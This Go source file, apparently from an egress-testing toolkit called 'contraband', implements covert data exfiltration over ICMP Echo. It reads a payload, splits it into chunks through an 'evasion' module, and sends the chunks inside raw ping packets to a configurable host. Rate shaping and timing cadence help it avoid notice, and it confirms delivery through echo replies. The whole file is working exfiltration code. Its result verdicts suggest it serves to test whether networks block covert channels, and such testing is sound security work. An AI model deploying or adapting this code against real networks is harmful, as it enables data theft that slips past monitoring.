package covert

import (
	"context"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"strings"
	"time"

	"github.com/shehzade/contraband/pkg/client/evasion"
	"github.com/shehzade/contraband/pkg/client/exfil"
	"github.com/shehzade/contraband/pkg/common"
)

func init() {
	exfil.RegisterExfiltrator(common.ProtoICMPEcho, NewICMPExfiltrator())
}

// ICMPExfiltrator implements RFC 792 ICMP Echo Smuggling with sequence ACK.
type ICMPExfiltrator struct{}

func NewICMPExfiltrator() *ICMPExfiltrator {
	return &ICMPExfiltrator{}
}

func (e *ICMPExfiltrator) Protocol() string {
	return common.ProtoICMPEcho
}

// ComputeICMPChecksum calculates the RFC 792 / RFC 1071 internet checksum.
func ComputeICMPChecksum(data []byte) uint16 {
	var sum uint32
	length := len(data)
	for i := 0; i < length-1; i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if length%2 == 1 {
		sum += uint32(data[length-1]) << 8
	}
	for sum > 0xFFFF {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return ^uint16(sum)
}

// BuildICMPEchoRequest builds an RFC 792 ICMP Type 8 packet.
func BuildICMPEchoRequest(id, seq uint16, payload []byte) []byte {
	pkt := make([]byte, 8+len(payload))
	pkt[0] = 8 // Type 8: Echo Request
	pkt[1] = 0 // Code 0
	pkt[2] = 0 // Checksum high
	pkt[3] = 0 // Checksum low
	binary.BigEndian.PutUint16(pkt[4:6], id)
	binary.BigEndian.PutUint16(pkt[6:8], seq)
	copy(pkt[8:], payload)

	cs := ComputeICMPChecksum(pkt)
	binary.BigEndian.PutUint16(pkt[2:4], cs)
	return pkt
}

func classifyCovertError(err error) common.Verdict {
	if err == nil {
		return common.VerdictSuccess
	}
	errStr := strings.ToLower(err.Error())
	if strings.Contains(errStr, "permission denied") || strings.Contains(errStr, "operation not permitted") {
		return common.VerdictBlockedL4
	}
	return common.ClassifyError(err)
}

func calculateCovertDurations(r *common.ProbeResult) {
	if r.Timestamps.TeardownDone.IsZero() {
		r.Timestamps.TeardownDone = time.Now().UTC()
	}
	r.Timestamps.ComputeDurations()
	if r.Timestamps.TransferDuration > 0 && r.BytesSent > 0 {
		r.ThroughputBps = float64(r.BytesSent*8) / (float64(r.Timestamps.TransferDuration) / float64(time.Second)) / 1000.0
	}
}

func (e *ICMPExfiltrator) Exfiltrate(ctx context.Context, reader io.Reader, opts exfil.ExfilOptions) (*common.ProbeResult, error) {
	if err := opts.Validate(); err != nil {
		return nil, err
	}

	start := time.Now().UTC()
	result, err := common.NewProbeResult("exfil", e.Protocol(), opts.TargetHost, opts.TargetPort)
	if err != nil {
		return nil, err
	}
	result.Timestamps.StartTCP = start
	result.PayloadType = opts.PayloadType
	result.CarrierType = opts.CarrierType

	payload, err := io.ReadAll(reader)
	if err != nil {
		return nil, fmt.Errorf("failed to read payload: %w", err)
	}
	result.TargetVolume = int64(len(payload))

	if opts.ExpectedHash == "" {
		h := sha256.Sum256(payload)
		opts.ExpectedHash = hex.EncodeToString(h[:])
	}
	result.PayloadHash = opts.ExpectedHash

	if opts.SessionToken.IsZero() {
		tok, tokErr := common.NewSessionToken()
		if tokErr != nil {
			return nil, tokErr
		}
		opts.SessionToken = tok
	}

	chunks, err := evasion.ChunkPayload(payload, opts.SessionToken, opts.ChunkSize)
	if err != nil {
		return nil, fmt.Errorf("failed to chunk payload: %w", err)
	}

	dstIP := net.ParseIP(opts.TargetHost)
	if dstIP == nil {
		ips, err := net.LookupIP(opts.TargetHost)
		if err != nil || len(ips) == 0 {
			result.Verdict = common.VerdictBlockedL4
			result.ErrorMessage = fmt.Sprintf("DNS lookup failed for %s: %v", opts.TargetHost, err)
			calculateCovertDurations(&result)
			return &result, err
		}
		dstIP = ips[0]
	}

	// Open raw ICMP socket (or fallback to unprivileged UDP-encapsulated probe if permitted)
	conn, listenErr := net.ListenPacket("ip4:icmp", "0.0.0.0")
	if listenErr != nil {
		// Detect permission errors cleanly without panics
		result.Verdict = common.VerdictBlockedL4
		result.ErrorMessage = fmt.Sprintf("ICMP raw socket permission denied: %v", listenErr)
		calculateCovertDurations(&result)
		return &result, listenErr
	}
	defer conn.Close()

	result.Timestamps.ConnectedTCP = time.Now().UTC()
	result.Timestamps.FirstByteSent = time.Now().UTC()

	var icmpID uint16 = uint16(opts.SessionToken[0])<<8 | uint16(opts.SessionToken[1])

	targetAddr := &net.IPAddr{IP: dstIP}

	for i, chunkFrame := range chunks {
		seq := uint16(i + 1)

		if opts.Shaper != nil {
			if err := opts.Shaper.WaitN(ctx, len(chunkFrame)); err != nil {
				result.Verdict = classifyCovertError(err)
				result.ErrorMessage = err.Error()
				calculateCovertDurations(&result)
				return &result, err
			}
		}
		if opts.Cadence != nil {
			delay := opts.Cadence.NextDelay()
			if delay > 0 {
				select {
				case <-time.After(delay):
				case <-ctx.Done():
					result.Verdict = classifyCovertError(ctx.Err())
					result.ErrorMessage = ctx.Err().Error()
					calculateCovertDurations(&result)
					return &result, ctx.Err()
				}
			}
		}

		echoPkt := BuildICMPEchoRequest(icmpID, seq, chunkFrame)
		if _, writeErr := conn.WriteTo(echoPkt, targetAddr); writeErr != nil {
			result.Verdict = classifyCovertError(writeErr)
			result.ErrorMessage = fmt.Sprintf("ICMP write failed: %v", writeErr)
			calculateCovertDurations(&result)
			return &result, writeErr
		}
		result.BytesSent += int64(len(echoPkt))

		// Await ICMP Echo Reply Type 0
		_ = conn.SetReadDeadline(time.Now().Add(opts.Timeout))
		replyBuf := make([]byte, 1500)
		for {
			n, peer, readErr := conn.ReadFrom(replyBuf)
			if readErr != nil {
				result.Verdict = classifyCovertError(readErr)
				result.ErrorMessage = fmt.Sprintf("ICMP reply timeout/error for chunk %d: %v", seq, readErr)
				calculateCovertDurations(&result)
				return &result, readErr
			}
			result.BytesRecv += int64(n)

			if n < 8 {
				continue
			}

			// Validate Type 0 (Echo Reply), matching ID and Seq
			replyType := replyBuf[0]
			replySeq := binary.BigEndian.Uint16(replyBuf[6:8])
			if replyType == 0 && replySeq == seq {
				_ = peer
				break
			}
		}
	}

	result.Timestamps.AckReceived = time.Now().UTC()
	result.Timestamps.TeardownDone = time.Now().UTC()
	result.Verdict = common.VerdictSuccess
	result.RawEvidence = common.FormatBoundedRawEvidence(payload)
	calculateCovertDurations(&result)

	return &result, nil
}
